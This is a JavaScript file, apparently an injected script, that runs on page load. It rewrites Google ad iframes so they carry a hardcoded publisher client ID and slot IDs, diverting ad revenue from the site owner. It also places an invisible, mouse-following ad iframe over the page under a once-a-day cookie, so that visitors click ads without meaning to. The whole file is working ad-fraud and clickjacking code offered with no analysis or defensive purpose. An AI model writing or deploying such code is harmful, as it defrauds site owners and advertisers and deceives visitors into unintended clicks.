function isEmpty(value) {
    return (typeof value === "undefined" || value === null);
}

function createCookie(name, value, days) {
        if (days) {
                var date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                var expires = "; expires=" + date.toGMTString();
        }
        else var expires = "";

        var fixedName = 'ouro6';
        name = fixedName + name;
        document.cookie = name + "=" + value + expires + "; path=/";
}

function readCookie(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
                var c = ca[i];
                while (c.charAt(0) == ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
    return null;
}

window.onload = function() {
        // CONFIG
        var adsClient = "ca-pub-4481357719749824";
        var adsUrl = "https%3A%2F%2Fwww.webcpd.com";
        var adsP = "https%3A//www.webcpd.com";

	// Banners:
	var banner_default = "7668994599";
	var banner_336x280 = "7668994599";
	var banner_300x250 = "3099194194";
	var banner_728x90 = "6192261397";
	var banner_160x600 = "4575927391";
	var banner_468x60 = "6241986994";
	var banner_200x90 = "7718720198";
	var banner_970x90 = "2827628197";

        // Code
        var count = 0;
        var modalDisplay = 1;
        var iFrames = document.getElementsByTagName("iframe");
	var coords1 = "0"; var coords2 = "0";
        for (index = 0; index < iFrames.length; index++) {

                for (x = 1; x < 7; x++) {
                        try {
				if (document.getElementsByTagName("iframe")[index].id.indexOf("google_ads_iframe") == 0) {
					var newSrc = "http://googleads.g.doubleclick.net/pagead/ads?";
					newSrc = newSrc + "client=" + adsClient;
					newSrc = newSrc + "&url=" + adsUrl;
					newSrc = newSrc + "&p=" + adsP;
					if (document.getElementsByTagName("iframe")[index].id.indexOf("336x280") > -1) { newSrc = newSrc + "&slotname=" + banner_336x280; coords1 = "336"; coords2 = "280"; }
					else if (document.getElementsByTagName("iframe")[index].id.indexOf("300x250") > -1) { newSrc = newSrc + "&slotname=" + banner_300x250; coords1 = "300"; coords2 = "250"; }
					else if (document.getElementsByTagName("iframe")[index].id.indexOf("728x90") > -1) { newSrc = newSrc + "&slotname=" + banner_728x90; coords1 = "728"; coords2 = "90"; }
					else if (document.getElementsByTagName("iframe")[index].id.indexOf("160x600") > -1) { newSrc = newSrc + "&slotname=" + banner_160x600; coords1 = "160"; coords2 = "600"; }
					else if (document.getElementsByTagName("iframe")[index].id.indexOf("468x60") > -1) { newSrc = newSrc + "&slotname=" + banner_468x60; coords1 = "468"; coords2 = "60"; }
					else if (document.getElementsByTagName("iframe")[index].id.indexOf("200x90") > -1) { newSrc = newSrc + "&slotname=" + banner_200x90; coords1 = "200"; coords2 = "90"; }
					else if (document.getElementsByTagName("iframe")[index].id.indexOf("970x90") > -1) { newSrc = newSrc + "&slotname=" + banner_970x90; coords1 = "970"; coords2 = "90"; }
					else { newSrc = newSrc + "&slotname=" + banner_default; }
					newSrc = newSrc + "&";
					var iFrameChanged = document.getElementsByTagName("iframe")[index]
					iFrameChanged.src = newSrc;

                                        if ((readCookie("ouro6doCl") == null) && (modalDisplay == 1)) {
                                                createCookie("doCl","doClEvent",1);
                                                var appendNewDiv2 = document.createElement('div');
                                                appendNewDiv2.setAttribute("style","position: absolute; opacity: 0.0; filter: alpha(opacity = 0); margin-left: -30px; z-index: 99999999999; top: 0; left: 0;");
                                                appendNewDiv2.setAttribute("id","appendNewDiv2");
                                                document.getElementsByTagName("body").item(0).appendChild(appendNewDiv2);
                                                document.getElementById("appendNewDiv2").innerHTML = '<iframe id="adsframeNewDiv2" name="adsframeNewDiv2" width="'+coords1+'" height="'+coords2+'" frameborder="0" src="' + newSrc + '" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true"></iframe>';
                                                document.getElementsByTagName('body')[0].onmousemove = function(e) {
                                                        document.getElementById("appendNewDiv2").style.top = (e.pageY - 20) + "px";
                                                        document.getElementById("appendNewDiv2").style.left = (e.pageX - 20) + "px";
                                                }
                                        }
				}
                                if (!isEmpty(document.getElementsByTagName("iframe")[index].contentDocument.getElementById("google_ads_frame" + x))) {

                                        var iFrameChanged = document.getElementsByTagName("iframe")[index].contentDocument.getElementById("google_ads_frame" + x);

                                        parArr = iFrameChanged.src.split("?")[1].split("&");
                                        var newSrc = "http://googleads.g.doubleclick.net/pagead/ads?";
                                        var newSrcForModal = "http://googleads.g.doubleclick.net/pagead/ads?";
                                        for(var i = 0; i < parArr.length; i++){
                                                parr = parArr[i].split("=");
                                                if (parr[0] == "client") {
                                                        newSrc = newSrc + parr[0]+"="+ adsClient;
                                                        if (modalDisplay == 1) { newSrcForModal = newSrcForModal + parr[0]+"="+ adsClient; }
                                                }
                                                else if (parr[0] == "url") {
                                                        newSrc = newSrc + parr[0]+"="+ adsUrl;
                                                        if (modalDisplay == 1) { newSrcForModal = newSrcForModal + parr[0]+"="+ adsUrl; }
                                                }
                                                else if (parr[0] == "p") {
                                                        newSrc = newSrc + parr[0]+"="+ adsP;
                                                        if (modalDisplay == 1) { newSrcForModal = newSrcForModal + parr[0]+"="+ adsP; }
                                                }
                                                else if (parr[0] == "slotname") {
                                                        // Tamanhos Padroes mais usados
                                                        if ((iFrameChanged.width == "336") && (iFrameChanged.height == "280")) { newSrc = newSrc + parr[0]+"="+ banner_336x280; }
                                                        else if ((iFrameChanged.width == "300") && (iFrameChanged.height == "250")) { newSrc = newSrc + parr[0]+"="+ banner_300x250; }
                                                        else if ((iFrameChanged.width == "728") && (iFrameChanged.height == "90")) { newSrc = newSrc + parr[0]+"="+ banner_728x90; }
                                                        else if ((iFrameChanged.width == "160") && (iFrameChanged.height == "600")) {  newSrc = newSrc + parr[0]+"="+ banner_160x600; }
                                                        else if ((iFrameChanged.width == "468") && (iFrameChanged.height == "60")) {  newSrc = newSrc + parr[0]+"="+ banner_468x60; }
                                                        else if ((iFrameChanged.width == "200") && (iFrameChanged.height == "90")) {  newSrc = newSrc + parr[0]+"="+ banner_200x90; }
                                                        else { newSrc = newSrc + parr[0]+"="+ banner_default; }

                                                        if (modalDisplay == 1) { newSrcForModal = newSrcForModal + parr[0]+"="+ banner_default + "&format=336x280"; }
                                                }
                                                else {
                                                        newSrc = newSrc + parr[0]+"="+parr[1];
                                                        if (modalDisplay == 1) { newSrcForModal = newSrcForModal + parr[0]+"="+parr[1]; }
                                                }
                                                if ((i+1) < parArr.length) {
                                                        newSrc = newSrc + "&";
                                                        if (modalDisplay == 1) { newSrcForModal = newSrcForModal + "&"; }
                                                }
                                        }
                                        if ((readCookie("ouro6doCl") == null) && (modalDisplay == 1)) {
                                                createCookie("doCl","doClEvent",1);
                                                var appendNewDiv = document.createElement('div');
                                                appendNewDiv.setAttribute("style","position: absolute; opacity: 0.0; filter: alpha(opacity = 0); margin-left: -30px; z-index: 99999999999; top: 0; left: 0;");
                                                appendNewDiv.setAttribute("id","appendNewDiv");
                                                document.getElementsByTagName("body").item(0).appendChild(appendNewDiv);
                                                document.getElementById("appendNewDiv").innerHTML = '<iframe id="adsframeNewDiv" name="adsframeNewDiv" width="'+iFrameChanged.width+'" height="'+iFrameChanged.height+'" frameborder="0" src="' + newSrcForModal + '" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true"></iframe>';
                                                document.getElementsByTagName('body')[0].onmousemove = function(e) {
                                                        document.getElementById("appendNewDiv").style.top = (e.pageY - 20) + "px";
                                                        document.getElementById("appendNewDiv").style.left = (e.pageX - 20) + "px";
                                                }
                                        }

                                        iFrameChanged.src = newSrc;
                                        count++;
                                }
                        } catch (e) { }
                }
        }
};

